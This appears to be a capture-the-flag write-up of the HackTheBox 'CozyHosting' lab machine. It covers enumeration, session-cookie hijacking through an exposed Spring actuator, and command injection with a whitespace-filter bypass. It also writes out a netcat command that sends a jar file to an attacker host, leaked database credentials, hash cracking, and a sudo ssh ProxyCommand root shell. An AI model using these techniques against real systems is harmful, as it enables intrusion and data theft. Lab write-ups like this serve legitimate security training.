---
title:  "HackTheBox WriteUp - CozyHosting"
date:   2023-12-30
categories: cybersecurity htb
---
![card](/assets/images/cozyhosting/CozyHosting.png)
## Enumeration
An initial port scan showed two open ports: 22 and 80. The website hosts some flavor text and a login page.
```
$ nmap -sV -sC -Pn -p1-65535 -o nmap.scan cozyhosting.htb

Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 30 16:09:28 2023 -- 1 IP address (1 host up) scanned in 19.73 seconds
```
A directory scan also showed an admin page, which redirected to the login page. No easily guessable username/password combinations worked.
```
$ ./gobuster dir -u http://cozyhosting.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 97]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/logout               (Status: 204) [Size: 0]
```

A second directory scan using a different wordlist showed the `actuator` directory, which is a spring boot feature that exposes metrics about the application. 
```
$ ./gobuster dir -u http://cozyhosting.htb -w /usr/share/SecLists/Discovery/Web-Content/quickhits.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/quickhits.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/%ff/                 (Status: 400) [Size: 435]
/actuator             (Status: 200) [Size: 634]
/error                (Status: 500) [Size: 73]
/login                (Status: 200) [Size: 4431]
/actuator             (Status: 200) [Size: 634]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/sessions    (Status: 200) [Size: 148]
/actuator/health      (Status: 200) [Size: 15]
/actuator/beans       (Status: 200) [Size: 127224]
/actuator/mappings    (Status: 200) [Size: 9938]

```
The subdirectory `/actuator/env` showed multiple environment variables, sadly with redacted values. The `/actuator/sessions` displayed two sessions with their corresponding session ID.

```
{"0F28127A7CCC83670C29FA7E872CADD1":"kanderson","5600CEDA9C4A0AF01A14B7F633B50416":"UNAUTHORIZED"}
```

With this information a session hijacking attack could be performed, by taking kandersons session ID and setting our own `JSESSIONID` cookie to that value. This gave me access to the `/admin` page.
![admin-page](/assets/images/cozyhosting/image.png)

## Initial Foothold
The admin page contained a tool to add new server to the dashboard. By intercepting the request with Burp, I saw, that a POST request to `/executessh` was made. This made me think, that the server possibly executes an SSH command on the system. I tried multiple different parameters to validate this assumption. Adding a pipeline symbol to the end of the username field, generated a bash error message.

![Alt text](/assets/images/cozyhosting/image-3.png)

The command seemed to be executed in the following way: `ssh <username>@<hostname> ...`. By adding the pipeline, only `ssh <username>` was executed, which isn't a valid command anymore, resulting in the error message. This behaviour could be exploited to get remote command execution on the server. The username variable gets validated to not contain any whitespace characters. This can however be bypassed by using the internal field seperator variable `${IFS}`, which Linux replaces with a regular whitespace. Additionally it seemed like, only error messages got returned in the HTTP response, which is why STDOUT had to be redirected to STDERR to be able to see if the command got executed successfully. This was done using `1>&2`.

The request to execute a command looked like this in the end. The host variable was completely ignored and just had to contain something to count as a "valid" hostname.

![Alt text](/assets/images/cozyhosting/image-4.png)

Now a reverse shell could be executed on the host. To not have to worry about special characters the command was encoded as base64 and decoded on the host, before executing it.

![Alt text](/assets/images/cozyhosting/image-1.png)

In the `/app` directory there was a .jar file. This was downloaded using netcat.

```
$ ls
cloudhosting-0.0.1.jar
```
```
$ nc 10.10.14.8 4445 < cloudhosting-0.0.1.jar
```

The .jar file could now be decompiled using the JD-GUI tool. Inside the `application.properties` some database credentials were found.

![Alt text](/assets/images/cozyhosting/image-2.png)

Back on the reverse shell, the credentials could be used to log into the postgres database. The database contained two tables, one called hosts and one called users. The users table contained password hashes for the kanderson user seen previously and an admin user.

```
$ psql -h localhost -U postgres -d cozyhosting                  
Password for user postgres: Vg&nvzAQ7XxR

\dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

```

The admin password was able to be cracked using an offline bruteforce attack.

```
hashcat -O -m 3200 -a 0 hashes /usr/share/wordlists/rockyou.txt --show
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

The credentials could then be used to log into the system as the user josh. This led to the user flag.

```
josh@cozyhosting:~$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Privilege Escalation

Executing `sudo -l` as the josh user showed, that he is allowed to run the ssh CLI using sudo. The ssh CLI does not instantly drop sudo permissions which makes it possible to execute a command using the `ProxyCommand` option. This made it possible to open a shell as root.

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
```

```
# cat root.txt	
XXXXXXXXXXXXXXXXXXXXXXXXX
```


## Reflection
I struggeled alot with getting to the user flag. Working out how to bypass the validation of whitespaces took me a while, but I think this was a good learning experience for the future. After being able to execute commands, getting the reverse shell was easier, thanks to my previous experiences working with the base64 encoding. Additionally I learned how to download files using netcat, which I hadn't done before.